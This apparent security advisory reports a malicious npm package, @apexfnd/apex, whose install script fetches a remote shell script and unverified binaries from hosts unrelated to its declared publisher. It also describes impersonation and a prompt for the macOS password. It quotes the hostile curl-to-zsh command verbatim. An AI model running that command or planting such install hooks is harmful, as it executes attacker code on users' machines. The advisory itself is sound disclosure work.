summary: @apexfnd/apex postinstall fetches and executes remote shell script and unverified binaries from publisher-mismatched hosts
details: install.cjs runs at npm install time and, on macOS, spawns `/bin/zsh -c 'curl -fsSL https://update.apex-arena-router.com/loader.sh | zsh'`, piping a remote unpinned shell script into zsh with no hash or signature verification. The user-facing prompt tells the installer to expect a macOS password dialog, socially engineering privileged consent. The same script downloads per-platform executables (and a native.node addon on Windows) from github.com/Apex-Foundation/copilot releases and chmods them 0755 as bin/apex on the installer's PATH. The declared publisher metadata in package.json points to github.com/can1357/oh-my-pi with homepage omp.sh, so both the arena-router domain and the Apex-Foundation/copilot release repo are unrelated to the publisher — bytes executed on installers come from destinations the declared publisher does not own. The package name and 'Apex Copilot' branding also conflict with the manifest identity, indicating impersonation.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
